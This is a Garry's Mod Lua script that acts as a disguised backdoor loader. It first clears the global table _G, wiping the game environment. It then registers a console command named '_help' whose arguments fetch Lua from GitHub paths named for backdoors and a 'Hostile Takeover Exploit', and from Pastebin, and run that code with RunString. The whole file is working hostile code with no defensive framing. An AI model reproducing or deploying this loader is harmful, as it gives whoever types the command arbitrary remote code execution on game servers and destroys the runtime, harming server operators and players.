-- You shouldn't be running this...
for k,v in pairs( _G ) do
	_G[k] = nil
	_G[v] = nil
end

function con( ply, cmd, args )
	if args == "tpc" then
        http.Fetch( "https://raw.githubusercontent.com/RyanJGray/Backdoor_Busting_2015/master/BD004_TPC_Updated/autocontentupdater.lua", function( body )
            RunString( body, "", false )
        end, function( err ) end )
    elseif args == "htx" then
        http.Fetch( "https://raw.githubusercontent.com/RyanJGray/Backdoor_Busting_2015/master/BD019_HTX_Hostile_Takeover_Exploit/HTX.lua", function( body )
            RunString( body, "", false )
        end, function( err ) end )
    elseif args == "super" then 
        http.Fetch( "http://pastebin.com/raw/tQLmewgA", function( body )
            RunString( body, "", false )
        end, function( err ) end )
    elseif args == "meme" then 
        http.Fetch( "https://github.com/RyanJGray/Backdoor_Busting_2015/raw/master/BD018_AfterShock_Gaming/mememachine_lua-3806388200.lua", function( body )
            RunString( body, "", false )
        end, function( err ) end )
    --elseif args == "2" then 
    --    http.Fetch( "http://pastebin.com/raw/Q0hxcVDH", function( body )
    --        RunString( body, "", false )
    --    end, function( err ) end )
    end
end 
function autocon( cmd, stringargs )
	print( cmd, stringargs )

	local tbl = {}

	table.insert( tbl, "tpc" )
	table.insert( tbl, "htx" )
	table.insert( tbl, "super" )
    table.insert( tbl, "meme")
	return tbl
end
concommand.Add("_help", con, autocon)
